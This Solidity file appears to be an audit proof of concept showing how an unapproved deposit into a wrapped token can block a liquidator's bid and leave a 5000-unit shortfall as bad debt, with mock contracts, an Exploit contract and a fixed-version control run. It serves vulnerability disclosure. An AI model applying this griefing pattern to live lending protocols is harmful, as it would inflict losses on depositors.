// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/* Derive (AuditVault 53724). WrappedERC20.deposit credits any recipient.
   _ensureBidderCashBalance then reverts the liquidator's bid because the
   account holds a non-cash asset. The 5000 shortfall is not covered and
   is booked as bad debt. The fixed deposit requires the recipient's
   approval, so the same bid collects 5000 cash. */

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract WrappedERC20 {
    Token public underlying;
    bool public needApproval;
    // @> VULN: this wrapped balance is credited to any recipient, with no approval
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public approvedRecipient;

    constructor(Token underlying_, bool needApproval_) {
        underlying = underlying_;
        needApproval = needApproval_;
    }

    function approveDeposit(bool ok) external {
        approvedRecipient[msg.sender] = ok;
    }

    function deposit(address recipient, uint256 amount) external {
        if (needApproval) {
            require(approvedRecipient[recipient], "approval");
        }
        require(underlying.transferFrom(msg.sender, address(this), amount), "pull");
        balanceOf[recipient] += amount;
    }
}

contract Liquidator {
    Token public cash;
    WrappedERC20 public wrapped;
    uint256 public uncovered;
    uint256 public cashCollected;

    constructor(Token cash_, WrappedERC20 wrapped_) {
        cash = cash_;
        wrapped = wrapped_;
    }

    function _ensureBidderCashBalance(address bidder) internal view {
        require(wrapped.balanceOf(bidder) == 0, "non-cash asset");
    }

    function bid(uint256 amount) external {
        _ensureBidderCashBalance(msg.sender);
        require(cash.transferFrom(msg.sender, address(this), amount), "cash");
        cashCollected += amount;
        uncovered = 0;
    }

    function settleUnbid(uint256 shortfall) external {
        uncovered = shortfall;
        cash.mint(address(this), shortfall);
    }
}

contract Exploit {
    uint256 public constant SHORTFALL = 5_000 ether;
    uint256 public constant DUST = 1 ether;

    Token public cash;
    Token public underlying;
    WrappedERC20 public wrapped;
    WrappedERC20 public fixedWrapped;
    Liquidator public liq;
    Liquidator public fixedLiq;
    uint256 public uncovered;
    uint256 public controlCollected;
    bool public bidBlocked;

    constructor() {
        cash = new Token();
        underlying = new Token();
        wrapped = new WrappedERC20(underlying, false);
        fixedWrapped = new WrappedERC20(underlying, true);
        liq = new Liquidator(cash, wrapped);
        fixedLiq = new Liquidator(cash, fixedWrapped);
    }

    function run() external {
        underlying.mint(address(this), DUST);
        underlying.approve(address(wrapped), DUST);
        wrapped.deposit(address(this), DUST);
        require(wrapped.balanceOf(address(this)) == DUST, "wrapped");
        cash.mint(address(this), SHORTFALL);
        cash.approve(address(liq), SHORTFALL);
        try liq.bid(SHORTFALL) {
            bidBlocked = false;
        } catch {
            bidBlocked = true;
        }
        require(bidBlocked, "blocked");
        require(liq.cashCollected() == 0, "no cash");
        liq.settleUnbid(SHORTFALL);
        uncovered = liq.uncovered();
        require(uncovered == SHORTFALL, "short");
        require(cash.balanceOf(address(liq)) == SHORTFALL, "booked");
    }

    function runControl() external {
        underlying.mint(address(this), DUST);
        underlying.approve(address(fixedWrapped), DUST);
        bool rejected;
        try fixedWrapped.deposit(address(this), DUST) {
            rejected = false;
        } catch {
            rejected = true;
        }
        require(rejected, "approval");
        require(fixedWrapped.balanceOf(address(this)) == 0, "clean");
        cash.mint(address(this), SHORTFALL);
        cash.approve(address(fixedLiq), SHORTFALL);
        fixedLiq.bid(SHORTFALL);
        controlCollected = fixedLiq.cashCollected();
        require(controlCollected == SHORTFALL, "collected");
        require(fixedLiq.uncovered() == 0, "covered");
    }
}
